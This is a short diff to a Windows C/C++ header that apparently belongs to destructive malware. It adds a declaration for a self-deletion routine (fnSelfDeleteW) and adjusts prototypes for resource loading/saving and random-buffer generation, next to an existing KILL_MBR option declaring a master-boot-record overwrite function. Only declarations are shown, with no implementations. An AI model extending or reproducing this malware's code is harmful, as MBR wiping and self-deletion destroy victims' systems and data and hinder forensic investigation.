@@ -71,6 +71,10 @@ BOOL fnDirectoryIteratorW(
 	_Inout_ std::vector<std::wstring>& vszDir,
 	_Inout_ std::vector<std::wstring>& vszFile
 );
+BOOL fnSelfDeleteW(
+	_In_ WCHAR szCd[],
+	_In_ WCHAR szMfn[]
+);
 
 #ifdef KILL_MBR
 BOOL fnOverwriteMBR(VOID);
@@ -106,15 +110,15 @@ std::wstring fnCryptGenRandomStringW(
 	_In_ INT nLen
 );
 VOID fnCryptGenRandomBufferW(
-	_Inout_ PBYTE pszRd,
+	_Inout_ LPBYTE pszRd,
 	_In_ ULONG ulFs
 );
 BOOL fnLoadResourceW(
 	_In_ WORD resID,
 	_Out_ LPVOID lpBuffer,
-	_Out_ PDWORD dwBufferSize
+	_Out_ LPDWORD dwBufferSize
 );
-BOOL fnSaveResource(
+BOOL fnSaveResourceW(
 	_In_ LPCWSTR lpName,
 	_In_ LPVOID lpBuffer,
 	_In_ DWORD dwBufferSize
